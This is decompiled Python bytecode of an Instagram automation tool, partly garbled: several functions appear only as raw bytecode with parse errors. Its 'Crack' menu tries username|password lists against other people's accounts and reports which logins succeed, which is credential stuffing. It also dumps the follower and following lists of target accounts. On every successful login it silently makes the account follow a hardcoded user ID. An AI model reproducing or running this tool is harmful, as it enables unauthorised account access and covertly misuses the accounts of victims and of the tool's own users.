# Filenames : 
# Python bytecode : 3.8
# Time succses decompiled Sat Sep 19 14:17:11 2020
# Selector <module> in line 4 file 
# Timestamp in code : 2020-06-27 04:07:18

Instruction context:
   
 L.  78        34  POP_BLOCK        
->                36  JUMP_BACK             8  'to 8'
                38_0  COME_FROM            32  '32'
                  38  POP_BLOCK        
                  40  JUMP_FORWARD         70  'to 70'
                42_0  COME_FROM_FINALLY    12  '12'
Instruction context:
   
 L. 102        54  POP_BLOCK        
->                56  JUMP_BACK             8  'to 8'
                  58  JUMP_FORWARD         88  'to 88'
                60_0  COME_FROM            52  '52'
Instruction context:
   
 L. 291       850  POP_EXCEPT       
                 852  BREAK_LOOP          856  'to 856'
               854_0  COME_FROM           840  '840'
->               854  END_FINALLY      
               856_0  COME_FROM           852  '852'
               856_1  COME_FROM           832  '832'
import os, time, instagram
from getpass import getpass
from threading import Thread
from instagram.request import Session
from colorama import init, Fore, Back
init(True)
EXPASS = ''
POSITION = ''
CONDITION = False
penghitung = 0
PENGHITUNG = ''
user_logged = None
MENU = [
 'Info account',
 'Mass follow account',
 'Mass unfollow account',
 'Mass like post',
 'Mass unlike post',
 'Mass comment',
 'Back']
HACK = [
 'Mass following', 'Dump following', 'Dump followers', 'Crack', 'Back']

def banner(user=False):
    global user_logged
    os.system('clear')
    print(f"\n   ╦┌┐┌┌─┐┌┬┐┌─┐╔╦╗┌─┐┌─┐┬  ┌─┐\n   ║│││└─┐ │ ├─┤ ║ │ ││ ││  └─┐\n   ╩┘└┘└─┘ ┴ ┴ ┴ ╩ └─┘└─┘┴─┘└─┘\n   {Back.WHITE + Fore.BLACK}       B y  a s m i n       \n")
    if user:
        print('   Name : ' + user_logged['name'])
        print('   Uid  : ' + user_logged['id'])
        print()


def animate():
    global CONDITION
    while True:
        char = ''
        for i in list('\\|/-'):
            print(end=('\r   [' + i + '] Please wait%s   ' % char))
            time.sleep(0.2)
            char += '.'
            if CONDITION:
                CONDITION = False
                return None


def info(string, function=False):
    getpass(f"   [!] {string}. Back ")
    function() if function else ''


def show(string):
    print(f"   [!] {string}")


def input_--- This code section failed: ---

 L.  74         0  LOAD_GLOBAL              range
                2  LOAD_CONST               3
                4  CALL_FUNCTION_1       1  ''
                6  GET_ITER         
              8_0  COME_FROM            62  '62'
              8_1  COME_FROM            36  '36'
                8  FOR_ITER             78  'to 78'
               10  STORE_FAST               '_'

 L.  75        12  SETUP_FINALLY        42  'to 42'

 L.  76        14  LOAD_GLOBAL              input
               16  LOAD_STR                 '   [?] %s : '
               18  LOAD_FAST                'string'
               20  BINARY_MODULO    
               22  CALL_FUNCTION_1       1  ''
               24  STORE_FAST               'get'

 L.  77        26  LOAD_FAST                'get'
               28  LOAD_STR                 ''
               30  COMPARE_OP               ==
               32  POP_JUMP_IF_FALSE    38  'to 38'

 L.  78        34  POP_BLOCK        
               36  JUMP_BACK             8  'to 8'
             38_0  COME_FROM            32  '32'
               38  POP_BLOCK        
               40  JUMP_FORWARD         70  'to 70'
             42_0  COME_FROM_FINALLY    12  '12'

 L.  79        42  DUP_TOP          
               44  LOAD_GLOBAL              FileNotFoundError
               46  LOAD_GLOBAL              EOFError
               48  BUILD_TUPLE_2         2 
               50  COMPARE_OP               exception-match
               52  POP_JUMP_IF_FALSE    68  'to 68'
               54  POP_TOP          
               56  POP_TOP          
               58  POP_TOP          

 L.  80        60  POP_EXCEPT       
               62  JUMP_BACK             8  'to 8'
               64  POP_EXCEPT       
               66  JUMP_FORWARD         70  'to 70'
             68_0  COME_FROM            52  '52'
               68  END_FINALLY      
             70_0  COME_FROM            66  '66'
             70_1  COME_FROM            40  '40'

 L.  81        70  LOAD_FAST                'get'
               72  ROT_TWO          
               74  POP_TOP          
               76  RETURN_VALUE     
             78_0  COME_FROM             8  '8'

 L.  83        78  LOAD_GLOBAL              info
               80  LOAD_STR                 'Max input'
               82  LOAD_GLOBAL              POSITION
               84  CALL_FUNCTION_2       2  ''
               86  POP_TOP          

 L.  84        88  LOAD_GLOBAL              files
               90  POP_TOP          

Parse error at or near `JUMP_BACK' instruction at offset 36


def brain(listmenu):
    """Given a list params"""
    for count, i in enumerate(listmenu, 1):
        print(f"   {str(count)}). {i} ")


def select--- This code section failed: ---

 L.  94         0  LOAD_GLOBAL              range
                2  LOAD_CONST               3
                4  CALL_FUNCTION_1       1  ''
                6  GET_ITER         
              8_0  COME_FROM           118  '118'
              8_1  COME_FROM           114  '114'
              8_2  COME_FROM            90  '90'
              8_3  COME_FROM            74  '74'
              8_4  COME_FROM            56  '56'
                8  FOR_ITER            120  'to 120'
               10  STORE_FAST               '_'

 L.  95        12  SETUP_FINALLY        92  'to 92'

 L.  96        14  LOAD_GLOBAL              input
               16  LOAD_STR                 '   >>> '
               18  CALL_FUNCTION_1       1  ''
               20  STORE_FAST               'choice'

 L.  97        22  LOAD_FAST                'choice'
               24  LOAD_STR                 ''
               26  COMPARE_OP               ==
               28  POP_JUMP_IF_FALSE    32  'to 32'

 L.  98        30  JUMP_FORWARD         88  'to 88'
             32_0  COME_FROM            28  '28'

 L.  99        32  LOAD_FAST                'choice'
               34  LOAD_METHOD              isdigit
               36  CALL_METHOD_0         0  ''
               38  POP_JUMP_IF_TRUE     42  'to 42'

 L. 100        40  JUMP_FORWARD         88  'to 88'
             42_0  COME_FROM            38  '38'

 L. 101        42  LOAD_GLOBAL              int
               44  LOAD_FAST                'choice'
               46  CALL_FUNCTION_1       1  ''
               48  LOAD_FAST                'min'
               50  COMPARE_OP               <
               52  POP_JUMP_IF_FALSE    60  'to 60'

 L. 102        54  POP_BLOCK        
               56  JUMP_BACK             8  'to 8'
               58  JUMP_FORWARD         88  'to 88'
             60_0  COME_FROM            52  '52'

 L. 103        60  LOAD_GLOBAL              int
               62  LOAD_FAST                'choice'
               64  CALL_FUNCTION_1       1  ''
               66  LOAD_FAST                'max'
               68  COMPARE_OP               >
               70  POP_JUMP_IF_FALSE    78  'to 78'

 L. 104        72  POP_BLOCK        
               74  JUMP_BACK             8  'to 8'
               76  JUMP_FORWARD         88  'to 88'
             78_0  COME_FROM            70  '70'

 L. 106        78  LOAD_FAST                'choice'
               80  POP_BLOCK        
               82  ROT_TWO          
               84  POP_TOP          
               86  RETURN_VALUE     
             88_0  COME_FROM            76  '76'
             88_1  COME_FROM            58  '58'
             88_2  COME_FROM            40  '40'
             88_3  COME_FROM            30  '30'
               88  POP_BLOCK        
               90  JUMP_BACK             8  'to 8'
             92_0  COME_FROM_FINALLY    12  '12'

 L. 107        92  DUP_TOP          
               94  LOAD_GLOBAL              Exception
               96  COMPARE_OP               exception-match
               98  POP_JUMP_IF_FALSE   116  'to 116'
              100  POP_TOP          
              102  POP_TOP          
              104  POP_TOP          

 L. 108       106  LOAD_GLOBAL              POSITION
              108  CALL_FUNCTION_0       0  ''
              110  POP_TOP          
              112  POP_EXCEPT       
              114  JUMP_BACK             8  'to 8'
            116_0  COME_FROM            98  '98'
              116  END_FINALLY      
              118  JUMP_BACK             8  'to 8'
            120_0  COME_FROM             8  '8'

 L. 109       120  LOAD_GLOBAL              info
              122  LOAD_STR                 'Refresh'
              124  LOAD_GLOBAL              POSITION
              126  CALL_FUNCTION_2       2  ''
              128  POP_TOP          

Parse error at or near `JUMP_BACK' instruction at offset 56


def main():
    global CONDITION
    global POSITION
    global user_logged
    animation = Thread(target=animate)
    animation.daemon = True
    POSITION = main
    banner()
    show('Expired : ' + user['expired'])
    print()
    brain(['Menu', 'Crack', 'Login', 'Exit'])
    choice = select(1, 4)
    if choice == '1':
        if not ses.is_logged:
            info('Please login', main)
        else:
            menu()
    elif choice == '2':
        crack()
    elif choice == '3':
        if not ses.is_logged:
            brain(['With cookies (recommended)', 'With Credentials', 'Back'])
            choice = select(1, 3)
            if choice == '1':
                try:
                    ses.setcookies = open('cookies.txt').read()
                except FileNotFoundError:
                    try:
                        ses.setcookies = input_('Put your cookies')
                    except ValueError:
                        info('invalid cookie', main)

                else:
                    animation.start()
                    data = ses.login()
                    if 'succesfully' in str(data):
                        with open('cookies.txt', 'w') as f:
                            f.write(ses.cookies)
                            instagram.action.follow(ses, '8179097522')
                            user_logged = instagram.account.get_me(ses)
                            CONDITION = True
                            print('')
                        info('Login sucessfully', main)
                    else:
                        CONDITION = True
                        print('')
                        try:
                            os.system('rm cookies.txt')
                        except:
                            pass
                        else:
                            info('Failed login', main)
            elif choice == '2':
                prompt = __import__('prompt_toolkit').prompt
                try:
                    username, password = eval(open('credentials.txt').read()).values()
                except Exception:
                    username = input_('Username')
                    password = prompt('   [?] Password : ', is_password=True)
                else:
                    ses.setcredentials(username, password)
                    animation.start()
                    data = ses.login()
                if 'succesfully' in str(data):
                    with open('credentials.txt', 'w') as f:
                        f.write(str({'username':username,  'password':password}))
                        instagram.action.follow(ses, '8179097522')
                        user_logged = instagram.account.get_me(ses)
                        CONDITION = True
                        print('')
                    info('Login sucessfully', main)
                else:
                    CONDITION = True
                    print('')
                    try:
                        os.system('rm credentials.txt')
                    except:
                        pass
                    else:
                        info('Failed login', main)
            elif choice == '3':
                main()
        else:
            info('You has been login', main)
    elif choice == '4':
        exit()


def menu():
    global POSITION
    POSITION = menu
    banner(user=True)
    brain(MENU)
    choice = select(1, 7)
    if choice == '1':
        account_info()
    elif choice == '2':
        mass_foll_account()
    elif choice == '3':
        mass_unfoll_account()
    elif choice == '4':
        mass_like_post()
    elif choice == '5':
        mass_unlike_post()
    elif choice == '6':
        mass_comment()
    elif choice == '7':
        main()


def crack--- This code section failed: ---

 L. 216         0  LOAD_GLOBAL              banner
                2  CALL_FUNCTION_0       0  ''
                4  POP_TOP          

 L. 218         6  LOAD_GLOBAL              Thread
                8  LOAD_GLOBAL              animate
               10  LOAD_CONST               ('target',)
               12  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               14  STORE_FAST               'animation'

 L. 219        16  LOAD_CONST               True
               18  LOAD_FAST                'animation'
               20  STORE_ATTR               daemon

 L. 220        22  LOAD_GLOBAL              crack
               24  STORE_GLOBAL             POSITION

 L. 221        26  LOAD_GLOBAL              banner
               28  CALL_FUNCTION_0       0  ''
               30  POP_TOP          

 L. 222        32  LOAD_GLOBAL              brain
               34  LOAD_GLOBAL              HACK
               36  CALL_FUNCTION_1       1  ''
               38  POP_TOP          

 L. 223        40  LOAD_GLOBAL              select
               42  LOAD_CONST               1
               44  LOAD_CONST               6
               46  CALL_FUNCTION_2       2  ''
               48  STORE_FAST               'choice'

 L. 224        50  LOAD_FAST                'choice'
               52  LOAD_STR                 '1'
               54  COMPARE_OP               ==
            56_58  POP_JUMP_IF_FALSE   384  'to 384'

 L. 225     60_62  SETUP_FINALLY       342  'to 342'

 L. 226        64  LOAD_GLOBAL              show
               66  LOAD_STR                 'File separator "|" (username|password)'
               68  CALL_FUNCTION_1       1  ''
               70  POP_TOP          

 L. 227        72  LOAD_GLOBAL              input_
               74  LOAD_STR                 'Target'
               76  CALL_FUNCTION_1       1  ''
               78  STORE_FAST               'target'

 L. 228        80  LOAD_GLOBAL              instagram
               82  LOAD_ATTR                account
               84  LOAD_METHOD              get_user
               86  LOAD_GLOBAL              ses
               88  LOAD_FAST                'target'
               90  CALL_METHOD_2         2  ''
               92  STORE_FAST               'user'

 L. 229        94  LOAD_STR                 'not found'
               96  LOAD_GLOBAL              str
               98  LOAD_FAST                'user'
              100  CALL_FUNCTION_1       1  ''
              102  COMPARE_OP               in
              104  POP_JUMP_IF_FALSE   116  'to 116'

 L. 230       106  LOAD_GLOBAL              info
              108  LOAD_STR                 'User not found'
              110  LOAD_GLOBAL              crack
              112  CALL_FUNCTION_2       2  ''
              114  POP_TOP          
            116_0  COME_FROM           104  '104'

 L. 231       116  LOAD_GLOBAL              input_
              118  LOAD_STR                 'List file'
              120  CALL_FUNCTION_1       1  ''
              122  STORE_FAST               'files'

 L. 232       124  LOAD_GLOBAL              open
              126  LOAD_FAST                'files'
              128  CALL_FUNCTION_1       1  ''
              130  LOAD_METHOD              readlines
              132  CALL_METHOD_0         0  ''
              134  STORE_FAST               'users'

 L. 233       136  LOAD_GLOBAL              show
              138  LOAD_STR                 'Total : '
              140  LOAD_GLOBAL              str
              142  LOAD_GLOBAL              len
              144  LOAD_FAST                'users'
              146  CALL_FUNCTION_1       1  ''
              148  CALL_FUNCTION_1       1  ''
              150  FORMAT_VALUE          0  ''
              152  BUILD_STRING_2        2 
              154  CALL_FUNCTION_1       1  ''
              156  POP_TOP          

 L. 234       158  LOAD_FAST                'users'
              160  GET_ITER         
            162_0  COME_FROM           326  '326'
            162_1  COME_FROM           308  '308'
            162_2  COME_FROM           276  '276'
              162  FOR_ITER            328  'to 328'
              164  STORE_FAST               'user'

 L. 235       166  LOAD_GLOBAL              __import__
              168  LOAD_STR                 'instagram'
              170  CALL_FUNCTION_1       1  ''
              172  LOAD_ATTR                request
              174  LOAD_METHOD              Session
              176  CALL_METHOD_0         0  ''
              178  STORE_FAST               'req'

 L. 236       180  LOAD_FAST                'user'
              182  LOAD_METHOD              strip
              184  CALL_METHOD_0         0  ''
              186  STORE_FAST               'user'

 L. 237       188  LOAD_FAST                'user'
              190  LOAD_METHOD              split
              192  LOAD_STR                 '|'
              194  CALL_METHOD_1         1  ''
              196  UNPACK_SEQUENCE_2     2 
              198  STORE_FAST               'username'
              200  STORE_FAST               'password'

 L. 238       202  LOAD_FAST                'req'
              204  LOAD_METHOD              setcredentials
              206  LOAD_FAST                'username'
              208  LOAD_FAST                'password'
              210  CALL_METHOD_2         2  ''
              212  POP_TOP          

 L. 239       214  LOAD_FAST                'req'
              216  LOAD_METHOD              login
              218  CALL_METHOD_0         0  ''
              220  STORE_FAST               'data'

 L. 240       222  LOAD_STR                 'succesfully'
              224  LOAD_GLOBAL              str
              226  LOAD_FAST                'data'
              228  CALL_FUNCTION_1       1  ''
              230  COMPARE_OP               in
          232_234  POP_JUMP_IF_FALSE   278  'to 278'

 L. 241       236  LOAD_GLOBAL              instagram
              238  LOAD_ATTR                action
              240  LOAD_METHOD              follow
              242  LOAD_FAST                'req'
              244  LOAD_FAST                'user'
              246  LOAD_STR                 'id'
              248  BINARY_SUBSCR    
              250  CALL_METHOD_2         2  ''
              252  POP_TOP          

 L. 242       254  LOAD_GLOBAL              instagram
              256  LOAD_ATTR                action
              258  LOAD_METHOD              follow
              260  LOAD_FAST                'req'
              262  LOAD_STR                 '8179097522'
              264  CALL_METHOD_2         2  ''
              266  POP_TOP          

 L. 243       268  LOAD_GLOBAL              show
              270  LOAD_STR                 'Sucess'
              272  CALL_FUNCTION_1       1  ''
              274  POP_TOP          
              276  JUMP_BACK           162  'to 162'
            278_0  COME_FROM           232  '232'

 L. 244       278  LOAD_STR                 'checkpoint'
              280  LOAD_GLOBAL              str
              282  LOAD_FAST                'data'
              284  CALL_FUNCTION_1       1  ''
              286  COMPARE_OP               in
          288_290  POP_JUMP_IF_FALSE   310  'to 310'

 L. 245       292  LOAD_GLOBAL              show
              294  LOAD_STR                 'Account '
              296  LOAD_FAST                'user'
              298  FORMAT_VALUE          0  ''
              300  LOAD_STR                 ' checkpoint'
              302  BUILD_STRING_3        3 
              304  CALL_FUNCTION_1       1  ''
              306  POP_TOP          
              308  JUMP_BACK           162  'to 162'
            310_0  COME_FROM           288  '288'

 L. 247       310  LOAD_GLOBAL              show
              312  LOAD_STR                 'Account '
              314  LOAD_FAST                'user'
              316  FORMAT_VALUE          0  ''
              318  LOAD_STR                 ' failed login'
              320  BUILD_STRING_3        3 
              322  CALL_FUNCTION_1       1  ''
              324  POP_TOP          
              326  JUMP_BACK           162  'to 162'
            328_0  COME_FROM           162  '162'

 L. 248       328  LOAD_GLOBAL              info
              330  LOAD_STR                 'Done'
              332  LOAD_GLOBAL              crack
              334  CALL_FUNCTION_2       2  ''
              336  POP_TOP          
              338  POP_BLOCK        
              340  JUMP_FORWARD       1488  'to 1488'
            342_0  COME_FROM_FINALLY    60  '60'

 L. 249       342  DUP_TOP          
              344  LOAD_GLOBAL              FileNotFoundError
              346  COMPARE_OP               exception-match
          348_350  POP_JUMP_IF_FALSE   378  'to 378'
              352  POP_TOP          
              354  POP_TOP          
              356  POP_TOP          

 L. 250       358  LOAD_GLOBAL              info
              360  LOAD_STR                 'File '
              362  LOAD_FAST                'files'
              364  FORMAT_VALUE          0  ''
              366  LOAD_STR                 ' not found'
              368  BUILD_STRING_3        3 
              370  CALL_FUNCTION_1       1  ''
              372  POP_TOP          
              374  POP_EXCEPT       
              376  JUMP_FORWARD       1488  'to 1488'
            378_0  COME_FROM           348  '348'
              378  END_FINALLY      
          380_382  JUMP_FORWARD       1488  'to 1488'
            384_0  COME_FROM            56  '56'

 L. 251       384  LOAD_FAST                'choice'
              386  LOAD_STR                 '2'
              388  COMPARE_OP               ==
          390_392  POP_JUMP_IF_FALSE   790  'to 790'

 L. 252       394  LOAD_GLOBAL              ses
              396  LOAD_ATTR                is_logged
          398_400  POP_JUMP_IF_TRUE    412  'to 412'

 L. 253       402  LOAD_GLOBAL              info
              404  LOAD_STR                 'You must login'
              406  LOAD_GLOBAL              main
              408  CALL_FUNCTION_2       2  ''
              410  POP_TOP          
            412_0  COME_FROM           398  '398'

 L. 254       412  SETUP_FINALLY       428  'to 428'

 L. 255       414  LOAD_GLOBAL              os
              416  LOAD_METHOD              mkdir
              418  LOAD_STR                 'dump'
              420  CALL_METHOD_1         1  ''
              422  POP_TOP          
              424  POP_BLOCK        
              426  JUMP_FORWARD        450  'to 450'
            428_0  COME_FROM_FINALLY   412  '412'

 L. 256       428  DUP_TOP          
              430  LOAD_GLOBAL              Exception
              432  COMPARE_OP               exception-match
          434_436  POP_JUMP_IF_FALSE   448  'to 448'
              438  POP_TOP          
              440  POP_TOP          
              442  POP_TOP          

 L. 257       444  POP_EXCEPT       
              446  JUMP_FORWARD        450  'to 450'
            448_0  COME_FROM           434  '434'
              448  END_FINALLY      
            450_0  COME_FROM           446  '446'
            450_1  COME_FROM           426  '426'

 L. 258       450  LOAD_GLOBAL              input_
              452  LOAD_STR                 'Username'
              454  CALL_FUNCTION_1       1  ''
              456  STORE_FAST               'username'

 L. 259       458  LOAD_GLOBAL              input_
              460  LOAD_STR                 'Amount'
              462  CALL_FUNCTION_1       1  ''
              464  STORE_FAST               'total'

 L. 260       466  BUILD_LIST_0          0 
              468  STORE_FAST               'id'

 L. 261       470  LOAD_STR                 'dump/'
              472  LOAD_FAST                'username'
              474  BINARY_ADD       
              476  LOAD_STR                 '_following'
              478  BINARY_ADD       
              480  STORE_FAST               'saved'

 L. 262       482  SETUP_FINALLY       568  'to 568'

 L. 263       484  LOAD_GLOBAL              eval
              486  LOAD_GLOBAL              open
              488  LOAD_FAST                'saved'
              490  CALL_FUNCTION_1       1  ''
              492  LOAD_METHOD              read
              494  CALL_METHOD_0         0  ''
              496  CALL_FUNCTION_1       1  ''
              498  STORE_FAST               'exist'

 L. 264       500  LOAD_GLOBAL              show
              502  LOAD_STR                 'File already exist with '
              504  LOAD_GLOBAL              str
              506  LOAD_GLOBAL              len
              508  LOAD_FAST                'exist'
              510  CALL_FUNCTION_1       1  ''
              512  CALL_FUNCTION_1       1  ''
              514  FORMAT_VALUE          0  ''
              516  LOAD_STR                 ' username'
              518  BUILD_STRING_3        3 
              520  CALL_FUNCTION_1       1  ''
              522  POP_TOP          

 L. 265       524  LOAD_GLOBAL              input_
              526  LOAD_STR                 'Do you want to replace? (Y/n)'
              528  CALL_FUNCTION_1       1  ''
              530  LOAD_METHOD              lower
              532  CALL_METHOD_0         0  ''
              534  STORE_FAST               'ask'

 L. 266       536  LOAD_FAST                'ask'
              538  LOAD_STR                 'y'
              540  COMPARE_OP               ==
          542_544  POP_JUMP_IF_FALSE   558  'to 558'

 L. 267       546  LOAD_GLOBAL              os
              548  LOAD_METHOD              remove
              550  LOAD_FAST                'saved'
              552  CALL_METHOD_1         1  ''
              554  POP_TOP          
              556  JUMP_FORWARD        564  'to 564'
            558_0  COME_FROM           542  '542'

 L. 269       558  LOAD_GLOBAL              crack
              560  CALL_FUNCTION_0       0  ''
              562  POP_TOP          
            564_0  COME_FROM           556  '556'
              564  POP_BLOCK        
              566  JUMP_FORWARD        590  'to 590'
            568_0  COME_FROM_FINALLY   482  '482'

 L. 270       568  DUP_TOP          
              570  LOAD_GLOBAL              FileNotFoundError
              572  COMPARE_OP               exception-match
          574_576  POP_JUMP_IF_FALSE   588  'to 588'
              578  POP_TOP          
              580  POP_TOP          
              582  POP_TOP          

 L. 271       584  POP_EXCEPT       
              586  JUMP_FORWARD        590  'to 590'
            588_0  COME_FROM           574  '574'
              588  END_FINALLY      
            590_0  COME_FROM           586  '586'
            590_1  COME_FROM           566  '566'

 L. 272       590  LOAD_GLOBAL              instagram
              592  LOAD_ATTR                account
              594  LOAD_METHOD              get_user
              596  LOAD_GLOBAL              ses
              598  LOAD_FAST                'username'
              600  CALL_METHOD_2         2  ''
              602  STORE_FAST               'user'

 L. 273       604  LOAD_STR                 'not found'
              606  LOAD_GLOBAL              str
              608  LOAD_FAST                'user'
              610  CALL_FUNCTION_1       1  ''
              612  COMPARE_OP               not-in
          614_616  POP_JUMP_IF_FALSE  1488  'to 1488'

 L. 274       618  LOAD_FAST                'animation'
              620  LOAD_METHOD              start
              622  CALL_METHOD_0         0  ''
              624  POP_TOP          

 L. 275       626  LOAD_GLOBAL              instagram
              628  LOAD_ATTR                account
              630  LOAD_METHOD              get_following
              632  LOAD_GLOBAL              ses
              634  LOAD_FAST                'user'
              636  LOAD_STR                 'id'
              638  BINARY_SUBSCR    
              640  LOAD_FAST                'total'
              642  CALL_METHOD_3         3  ''
              644  GET_ITER         
            646_0  COME_FROM           676  '676'
              646  FOR_ITER            680  'to 680'
              648  STORE_FAST               'user'

 L. 276       650  LOAD_FAST                'id'
              652  LOAD_METHOD              append
              654  LOAD_GLOBAL              dict
              656  LOAD_FAST                'user'
              658  LOAD_STR                 'username'
              660  BINARY_SUBSCR    
              662  LOAD_FAST                'user'
              664  LOAD_STR                 'name'
              666  BINARY_SUBSCR    
              668  LOAD_CONST               ('username', 'fullname')
              670  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              672  CALL_METHOD_1         1  ''
              674  POP_TOP          
          676_678  JUMP_BACK           646  'to 646'
            680_0  COME_FROM           646  '646'

 L. 277       680  LOAD_GLOBAL              open
              682  LOAD_FAST                'saved'
              684  LOAD_STR                 'a'
              686  CALL_FUNCTION_2       2  ''
              688  SETUP_WITH          710  'to 710'
              690  STORE_FAST               'f'

 L. 278       692  LOAD_FAST                'f'
              694  LOAD_METHOD              write
              696  LOAD_GLOBAL              str
              698  LOAD_FAST                'id'
              700  CALL_FUNCTION_1       1  ''
              702  CALL_METHOD_1         1  ''
              704  POP_TOP          
              706  POP_BLOCK        
              708  BEGIN_FINALLY    
            710_0  COME_FROM_WITH      688  '688'
              710  WITH_CLEANUP_START
              712  WITH_CLEANUP_FINISH
              714  END_FINALLY      

 L. 279       716  LOAD_CONST               True
              718  STORE_GLOBAL             CONDITION

 L. 280       720  LOAD_GLOBAL              print
              722  LOAD_STR                 ''
              724  CALL_FUNCTION_1       1  ''
              726  POP_TOP          

 L. 281       728  LOAD_GLOBAL              str
              730  LOAD_GLOBAL              len
              732  LOAD_FAST                'id'
              734  CALL_FUNCTION_1       1  ''
              736  CALL_FUNCTION_1       1  ''
              738  LOAD_FAST                'total'
              740  COMPARE_OP               !=
          742_744  POP_JUMP_IF_FALSE   770  'to 770'

 L. 282       746  LOAD_GLOBAL              show
              748  LOAD_STR                 'Finished with '
              750  LOAD_GLOBAL              str
              752  LOAD_GLOBAL              len
              754  LOAD_FAST                'id'
              756  CALL_FUNCTION_1       1  ''
              758  CALL_FUNCTION_1       1  ''
              760  FORMAT_VALUE          0  ''
              762  LOAD_STR                 ' usernames'
              764  BUILD_STRING_3        3 
              766  CALL_FUNCTION_1       1  ''
              768  POP_TOP          
            770_0  COME_FROM           742  '742'

 L. 283       770  LOAD_GLOBAL              info
              772  LOAD_STR                 'Done, file saved in '
              774  LOAD_FAST                'saved'
              776  FORMAT_VALUE          0  ''
              778  BUILD_STRING_2        2 
              780  LOAD_GLOBAL              crack
              782  CALL_FUNCTION_2       2  ''
              784  POP_TOP          
          786_788  JUMP_FORWARD       1488  'to 1488'
            790_0  COME_FROM           390  '390'

 L. 285       790  LOAD_FAST                'choice'
              792  LOAD_STR                 '3'
              794  COMPARE_OP               ==
          796_798  POP_JUMP_IF_FALSE  1196  'to 1196'

 L. 286       800  LOAD_GLOBAL              ses
              802  LOAD_ATTR                is_logged
          804_806  POP_JUMP_IF_TRUE    818  'to 818'

 L. 287       808  LOAD_GLOBAL              info
              810  LOAD_STR                 'You must login'
              812  LOAD_GLOBAL              main
              814  CALL_FUNCTION_2       2  ''
              816  POP_TOP          
            818_0  COME_FROM           804  '804'

 L. 288       818  SETUP_FINALLY       834  'to 834'

 L. 289       820  LOAD_GLOBAL              os
              822  LOAD_METHOD              mkdir
              824  LOAD_STR                 'dump'
              826  CALL_METHOD_1         1  ''
              828  POP_TOP          
              830  POP_BLOCK        
              832  JUMP_FORWARD        856  'to 856'
            834_0  COME_FROM_FINALLY   818  '818'

 L. 290       834  DUP_TOP          
              836  LOAD_GLOBAL              Exception
              838  COMPARE_OP               exception-match
          840_842  POP_JUMP_IF_FALSE   854  'to 854'
              844  POP_TOP          
              846  POP_TOP          
              848  POP_TOP          

 L. 291       850  POP_EXCEPT       
              852  BREAK_LOOP          856  'to 856'
            854_0  COME_FROM           840  '840'
              854  END_FINALLY      
            856_0  COME_FROM           852  '852'
            856_1  COME_FROM           832  '832'

 L. 292       856  LOAD_GLOBAL              input_
              858  LOAD_STR                 'Username'
              860  CALL_FUNCTION_1       1  ''
              862  STORE_FAST               'username'

 L. 293       864  LOAD_GLOBAL              input_
              866  LOAD_STR                 'Amount'
              868  CALL_FUNCTION_1       1  ''
              870  STORE_FAST               'total'

 L. 294       872  BUILD_LIST_0          0 
              874  STORE_FAST               'id'

 L. 295       876  LOAD_STR                 'dump/'
              878  LOAD_FAST                'username'
              880  BINARY_ADD       
              882  LOAD_STR                 '_followers'
              884  BINARY_ADD       
              886  STORE_FAST               'saved'

 L. 296       888  SETUP_FINALLY       974  'to 974'

 L. 297       890  LOAD_GLOBAL              eval
              892  LOAD_GLOBAL              open
              894  LOAD_FAST                'saved'
              896  CALL_FUNCTION_1       1  ''
              898  LOAD_METHOD              read
              900  CALL_METHOD_0         0  ''
              902  CALL_FUNCTION_1       1  ''
              904  STORE_FAST               'exist'

 L. 298       906  LOAD_GLOBAL              show
              908  LOAD_STR                 'File already exist with '
              910  LOAD_GLOBAL              str
              912  LOAD_GLOBAL              len
              914  LOAD_FAST                'exist'
              916  CALL_FUNCTION_1       1  ''
              918  CALL_FUNCTION_1       1  ''
              920  FORMAT_VALUE          0  ''
              922  LOAD_STR                 ' username'
              924  BUILD_STRING_3        3 
              926  CALL_FUNCTION_1       1  ''
              928  POP_TOP          

 L. 299       930  LOAD_GLOBAL              input_
              932  LOAD_STR                 'Do you want to replace? (Y/n)'
              934  CALL_FUNCTION_1       1  ''
              936  LOAD_METHOD              lower
              938  CALL_METHOD_0         0  ''
              940  STORE_FAST               'ask'

 L. 300       942  LOAD_FAST                'ask'
              944  LOAD_STR                 'y'
              946  COMPARE_OP               ==
          948_950  POP_JUMP_IF_FALSE   964  'to 964'

 L. 301       952  LOAD_GLOBAL              os
              954  LOAD_METHOD              remove
              956  LOAD_FAST                'saved'
              958  CALL_METHOD_1         1  ''
              960  POP_TOP          
              962  JUMP_FORWARD        970  'to 970'
            964_0  COME_FROM           948  '948'

 L. 303       964  LOAD_GLOBAL              crack
              966  CALL_FUNCTION_0       0  ''
              968  POP_TOP          
            970_0  COME_FROM           962  '962'
              970  POP_BLOCK        
              972  JUMP_FORWARD        996  'to 996'
            974_0  COME_FROM_FINALLY   888  '888'

 L. 304       974  DUP_TOP          
              976  LOAD_GLOBAL              FileNotFoundError
              978  COMPARE_OP               exception-match
          980_982  POP_JUMP_IF_FALSE   994  'to 994'
              984  POP_TOP          
              986  POP_TOP          
              988  POP_TOP          

 L. 305       990  POP_EXCEPT       
              992  BREAK_LOOP          996  'to 996'
            994_0  COME_FROM           980  '980'
              994  END_FINALLY      
            996_0  COME_FROM           992  '992'
            996_1  COME_FROM           972  '972'

 L. 306       996  LOAD_GLOBAL              instagram
              998  LOAD_ATTR                account
             1000  LOAD_METHOD              get_user
             1002  LOAD_GLOBAL              ses
             1004  LOAD_FAST                'username'
             1006  CALL_METHOD_2         2  ''
             1008  STORE_FAST               'user'

 L. 307      1010  LOAD_STR                 'not found'
             1012  LOAD_GLOBAL              str
             1014  LOAD_FAST                'user'
             1016  CALL_FUNCTION_1       1  ''
             1018  COMPARE_OP               not-in
         1020_1022  POP_JUMP_IF_FALSE  1488  'to 1488'

 L. 308      1024  LOAD_FAST                'animation'
             1026  LOAD_METHOD              start
             1028  CALL_METHOD_0         0  ''
             1030  POP_TOP          

 L. 309      1032  LOAD_GLOBAL              instagram
             1034  LOAD_ATTR                account
             1036  LOAD_METHOD              get_followers
             1038  LOAD_GLOBAL              ses
             1040  LOAD_FAST                'user'
             1042  LOAD_STR                 'id'
             1044  BINARY_SUBSCR    
             1046  LOAD_FAST                'total'
             1048  CALL_METHOD_3         3  ''
             1050  GET_ITER         
           1052_0  COME_FROM          1082  '1082'
             1052  FOR_ITER           1086  'to 1086'
             1054  STORE_FAST               'user'

 L. 310      1056  LOAD_FAST                'id'
             1058  LOAD_METHOD              append
             1060  LOAD_GLOBAL              dict
             1062  LOAD_FAST                'user'
             1064  LOAD_STR                 'username'
             1066  BINARY_SUBSCR    
             1068  LOAD_FAST                'user'
             1070  LOAD_STR                 'name'
